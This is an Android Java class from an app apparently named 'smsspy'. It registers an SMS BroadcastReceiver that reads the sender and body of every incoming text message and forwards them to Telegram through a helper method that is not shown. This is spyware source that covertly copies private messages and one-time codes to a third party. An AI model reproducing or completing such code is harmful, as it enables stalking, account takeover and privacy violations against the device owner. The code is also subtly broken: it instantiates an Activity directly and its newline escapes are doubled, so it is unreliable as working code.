package com.smsspy.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getOriginatingAddress();
                    String messageBody = sms.getMessageBody();
                    
                    // Forward to Telegram
                    String alert = "🚨 NEW SMS\\nFrom: " + sender + "\\nMessage: " + messageBody;
                    MainActivity activity = new MainActivity();
                    activity.sendToTelegram(alert);
                }
            }
        }
    }
}
